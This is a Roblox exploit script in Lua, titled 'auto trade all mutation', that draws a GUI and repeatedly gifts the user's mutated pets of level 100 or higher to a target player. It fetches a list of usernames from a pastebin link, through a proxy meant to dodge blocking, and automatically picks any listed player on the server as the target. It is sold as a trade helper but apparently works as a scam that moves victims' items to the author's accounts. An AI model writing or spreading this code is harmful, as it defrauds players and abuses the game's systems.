-- auto trade all mutation
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer

local TradeRemote = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Net"):WaitForChild("RF/Trade.SendGift")
local RAW_URL = "https://pastebin.com/raw/n6LvrFGC"

-- CẤU HÌNH
local MIN_LEVEL = 100
local TRADE_DELAY = 8 -- Chỉnh về 8 giây
local TradeEnabled, IsTrading = false, false
local TargetPlayer, SelectedPetName = nil, nil
local CooldownTime = 0
local Whitelist = {}

-- LẤY WHITELIST (CÓ HỖ TRỢ PROXY CHỐNG CHẶN)
local function UpdateWhitelist()
    local proxyUrl = "https://api.proxyscrape.com/v2/?request=getcontent&protocol=http&action=get&url="
    local success, content = pcall(function() return game:HttpGet(proxyUrl .. RAW_URL) end)
    if not success then
        success, content = pcall(function() return game:HttpGet(RAW_URL) end)
    end
    if success and content then
        Whitelist = {}
        for line in content:gmatch("[^\r\n]+") do
            local cleanName = line:gsub("^%s*(.-)%s*$", "%1"):lower()
            if cleanName ~= "" then table.insert(Whitelist, cleanName) end
        end
    end
end

local gui = Instance.new("ScreenGui", game.CoreGui)
gui.Name = "All Mutation"
gui.ResetOnSpawn = false

local MainFrame = Instance.new("Frame", gui)
MainFrame.Size = UDim2.fromOffset(480, 340)
MainFrame.Position = UDim2.fromScale(0.2, 0.2)
MainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
MainFrame.BorderSizePixel = 0
MainFrame.Visible = false
Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(0, 12)

local MainStroke = Instance.new("UIStroke", MainFrame)
MainStroke.Thickness = 2
MainStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border

local TitleBar = Instance.new("TextButton", MainFrame)
TitleBar.Size = UDim2.new(1, 0, 0, 40)
TitleBar.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
TitleBar.AutoButtonColor = false
TitleBar.Text = " Bố Mày Là Số 1 (V6.1 Final) "
TitleBar.Font = Enum.Font.GothamBold
TitleBar.TextSize = 14
TitleBar.TextColor3 = Color3.new(1, 1, 1)
TitleBar.TextXAlignment = Enum.TextXAlignment.Left
Instance.new("UICorner", TitleBar).CornerRadius = UDim.new(0, 12)

local CloseBtn = Instance.new("TextButton", MainFrame)
CloseBtn.Size = UDim2.fromOffset(30, 30)
CloseBtn.Position = UDim2.new(1, -35, 0, 5)
CloseBtn.BackgroundColor3 = Color3.fromRGB(180, 50, 50)
CloseBtn.Text = "X"
CloseBtn.TextColor3 = Color3.new(1, 1, 1)
CloseBtn.Font = Enum.Font.GothamBold
Instance.new("UICorner", CloseBtn).CornerRadius = UDim.new(0, 6)
CloseBtn.MouseButton1Click:Connect(function() gui:Destroy() end)

local toggleBtn = Instance.new("TextButton", MainFrame)
toggleBtn.Size = UDim2.new(0.65, -20, 0, 38)
toggleBtn.Position = UDim2.fromOffset(15, 50)
toggleBtn.Text = "STATUS: OFF"
toggleBtn.Font = Enum.Font.GothamBold
toggleBtn.TextSize = 14
toggleBtn.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
toggleBtn.TextColor3 = Color3.new(1, 1, 1)
Instance.new("UICorner", toggleBtn).CornerRadius = UDim.new(0, 8)
local BtnStroke = Instance.new("UIStroke", toggleBtn)
BtnStroke.Thickness = 2
BtnStroke.Enabled = false

local timerLbl = Instance.new("TextLabel", MainFrame)
timerLbl.Size = UDim2.new(0.35, -10, 0, 38)
timerLbl.Position = UDim2.new(0.65, 5, 0, 50)
timerLbl.BackgroundTransparency = 1
timerLbl.Text = "READY"
timerLbl.Font = Enum.Font.GothamBold
timerLbl.TextSize = 14
timerLbl.TextColor3 = Color3.new(0.4, 1, 0.4)

local ContentFrame = Instance.new("Frame", MainFrame)
ContentFrame.Size = UDim2.new(1, -30, 1, -135)
ContentFrame.Position = UDim2.fromOffset(15, 120)
ContentFrame.BackgroundTransparency = 1

local function createSideFrame(pos)
    local f = Instance.new("ScrollingFrame", ContentFrame)
    f.Size = UDim2.new(0.47, 0, 1, 0)
    f.Position = pos
    f.BackgroundTransparency = 1
    f.ScrollBarThickness = 0
    f.CanvasSize = UDim2.new(0,0,0,0)
    Instance.new("UIListLayout", f).Padding = UDim.new(0, 8)
    local pad = Instance.new("UIPadding", f)
    pad.PaddingTop, pad.PaddingBottom = UDim.new(0, 4), UDim.new(0, 4)
    pad.PaddingLeft, pad.PaddingRight = UDim.new(0, 6), UDim.new(0, 6)
    return f
end

local PlayerSide = createSideFrame(UDim2.fromScale(0, 0))
local PetSide = createSideFrame(UDim2.fromScale(0.53, 0))

local floatBtn = Instance.new("TextButton", gui)
floatBtn.Size = UDim2.fromOffset(55, 55)
floatBtn.Position = UDim2.fromScale(0.1, 0.5)
floatBtn.Text = "💸"
floatBtn.TextSize = 30
floatBtn.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
floatBtn.TextColor3 = Color3.new(1, 1, 1)
Instance.new("UICorner", floatBtn).CornerRadius = UDim.new(1, 0)
local FloatStroke = Instance.new("UIStroke", floatBtn)
FloatStroke.Thickness = 3

local ledList = {}
RunService.RenderStepped:Connect(function()
    local color = Color3.fromHSV(tick() % 5 / 5, 1, 1)
    MainStroke.Color = color
    FloatStroke.Color = color
    BtnStroke.Color = color
    TitleBar.TextColor3 = color
    for stroke, _ in pairs(ledList) do
        if stroke and stroke.Parent then stroke.Color = color else ledList[stroke] = nil end
    end
    if IsTrading then
        timerLbl.Text = "TRADING..."
        timerLbl.TextColor3 = Color3.new(1, 1, 0)
    elseif CooldownTime > 0 then
        timerLbl.Text = string.format("WAIT: %.1fs", CooldownTime)
        timerLbl.TextColor3 = Color3.new(1, 0.4, 0.4)
    else
        timerLbl.Text = TargetPlayer and "TARGET: OK" or "NO TARGET"
        timerLbl.TextColor3 = TargetPlayer and Color3.new(0.4, 1, 0.4) or Color3.new(1, 0.5, 0)
    end
end)

local function makeDraggable(obj, target)
    target = target or obj
    local dragToggle, dragStart, startPos
    obj.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragToggle = true dragStart = input.Position startPos = target.Position
        end
    end)
    UserInputService.InputChanged:Connect(function(input)
        if dragToggle and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
            local delta = input.Position - dragStart
            target.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)
    obj.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then dragToggle = false end
    end)
end

makeDraggable(TitleBar, MainFrame)
makeDraggable(floatBtn)

local function refreshPlayers()
    UpdateWhitelist()
    for _, v in ipairs(PlayerSide:GetChildren()) do if v:IsA("TextButton") then v:Destroy() end end
    
    if not TargetPlayer then
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr ~= LocalPlayer then
                for _, name in ipairs(Whitelist) do
                    if plr.Name:lower() == name or (plr.DisplayName and plr.DisplayName:lower() == name) then
                        TargetPlayer = plr
                        break
                    end
                end
            end
        end
    end

    for _, plr in ipairs(Players:GetPlayers()) do
        if plr ~= LocalPlayer then
            local isWhitelisted = false
            for _, name in ipairs(Whitelist) do
                if plr.Name:lower() == name or (plr.DisplayName and plr.DisplayName:lower() == name) then
                    isWhitelisted = true
                    break
                end
            end
            
            local isSelected = (TargetPlayer == plr)
            local b = Instance.new("TextButton", PlayerSide)
            b.Size = UDim2.new(0.95, 0, 0, 35)
            
            local prefix = ""
            if isWhitelisted then prefix = "⭐ " end
            if isSelected then prefix = "✅ " .. prefix end
            
            b.Text = prefix .. plr.DisplayName
            b.Font = (isWhitelisted or isSelected) and Enum.Font.GothamBold or Enum.Font.Gotham
            b.BackgroundColor3 = isSelected and Color3.fromRGB(40, 60, 40) or (isWhitelisted and Color3.fromRGB(40, 40, 20) or Color3.fromRGB(30, 30, 30))
            b.TextColor3 = Color3.new(1, 1, 1)
            b.BorderSizePixel = 0
            Instance.new("UICorner", b).CornerRadius = UDim.new(0, 6)
            
            if isSelected or isWhitelisted then
                local s = Instance.new("UIStroke", b)
                s.Thickness = 2
                s.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
                ledList[s] = true
            end

            b.MouseButton1Click:Connect(function()
                TargetPlayer = (TargetPlayer == plr) and nil or plr
                refreshPlayers()
            end)
        end
    end
    PlayerSide.CanvasSize = UDim2.new(0, 0, 0, PlayerSide.UIListLayout.AbsoluteContentSize.Y + 10)
end

local function updatePetList()
    local pets = {}
    for _, tool in ipairs(LocalPlayer.Backpack:GetChildren()) do
        local lvl = tonumber(tool:GetAttribute("Level")) or 0
        local mut = tool:GetAttribute("Mutation")
        if tool:IsA("Tool") and mut and mut ~= "" and lvl >= MIN_LEVEL then
            local name = tool:GetAttribute("BrainrotName") or tool.Name
            pets[name] = (pets[name] or 0) + 1
        end
    end
    for _, v in ipairs(PetSide:GetChildren()) do if v:IsA("TextButton") then v:Destroy() end end
    for name, count in pairs(pets) do
        local b = Instance.new("TextButton", PetSide)
        b.Size = UDim2.new(0.95, 0, 0, 35)
        local isSelected = (SelectedPetName == name)
        b.BackgroundColor3 = Color3.fromRGB(30,30,30)
        b.Text = ""
        b.BorderSizePixel = 0
        Instance.new("UICorner", b).CornerRadius = UDim.new(0, 6)
        if isSelected then
            local s = Instance.new("UIStroke", b)
            s.Thickness = 2
            s.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
            ledList[s] = true
        end
        local n = Instance.new("TextLabel", b)
        n.Size = UDim2.new(0.6, 0, 1, 0)
        n.Position = UDim2.fromOffset(8, 0)
        n.Text = (isSelected and "✅ " or "")..name
        n.TextColor3 = Color3.new(1, 1, 1)
        n.BackgroundTransparency = 1
        n.TextXAlignment = Enum.TextXAlignment.Left
        n.Font = isSelected and Enum.Font.GothamBold or Enum.Font.Gotham
        n.TextSize = 10
        local c = Instance.new("TextLabel", b)
        c.Size = UDim2.new(0.3, 0, 1, 0)
        c.Position = UDim2.fromScale(0.65, 0)
        c.Text = "x"..count
        c.TextColor3 = Color3.new(0.4, 1, 0.4)
        c.BackgroundTransparency = 1
        c.Font = Enum.Font.GothamBold
        c.TextSize = 11
        b.MouseButton1Click:Connect(function() SelectedPetName = (SelectedPetName == name) and nil or name updatePetList() end)
    end
    PetSide.CanvasSize = UDim2.new(0, 0, 0, PetSide.UIListLayout.AbsoluteContentSize.Y + 10)
end

task.spawn(function()
    while true do
        if CooldownTime > 0 then CooldownTime = math.max(0, CooldownTime - 0.1) end
        task.wait(0.1)
    end
end)

task.spawn(function()
    while true do
        if MainFrame.Visible then updatePetList() end
        task.wait(2)
    end
end)

task.spawn(function()
    while true do
        task.wait(0.5)
        if not TradeEnabled or IsTrading or CooldownTime > 0 or not TargetPlayer then continue end
        local targetPet = nil
        for _, tool in ipairs(LocalPlayer.Backpack:GetChildren()) do
            local lvl = tonumber(tool:GetAttribute("Level")) or 0
            local mut = tool:GetAttribute("Mutation")
            local name = tool:GetAttribute("BrainrotName") or tool.Name
            if tool:IsA("Tool") and mut and mut ~= "" and lvl >= MIN_LEVEL then
                if not SelectedPetName or name == SelectedPetName then
                    local count = 0
                    for _, t in ipairs(LocalPlayer.Backpack:GetChildren()) do
                        local tName = t:GetAttribute("BrainrotName") or t.Name
                        if tName == name then count += 1 end
                    end
                    -- Trade khi có từ 2 con trở lên (giữ lại đúng 1 con)
                    if count > 1 then targetPet = tool break end
                end
            end
        end
        if targetPet then
            IsTrading = true
            pcall(function()
                LocalPlayer.Character.Humanoid:EquipTool(targetPet)
                task.wait(0.5)
                TradeRemote:InvokeServer(TargetPlayer)
            end)
            task.wait(1)
            IsTrading = false
            CooldownTime = TRADE_DELAY
        end
    end
end)

floatBtn.MouseButton1Click:Connect(function() MainFrame.Visible = not MainFrame.Visible end)
toggleBtn.MouseButton1Click:Connect(function()
    TradeEnabled = not TradeEnabled
    toggleBtn.Text = TradeEnabled and "STATUS: ON" or "STATUS: OFF"
    toggleBtn.BackgroundColor3 = TradeEnabled and Color3.fromRGB(30, 80, 30) or Color3.fromRGB(80, 30, 30)
    BtnStroke.Enabled = TradeEnabled
    if TradeEnabled then refreshPlayers() end
end)

refreshPlayers()
task.spawn(function()
    while task.wait(30) do refreshPlayers() end
end)
Players.PlayerAdded:Connect(refreshPlayers)
Players.PlayerRemoving:Connect(refreshPlayers)
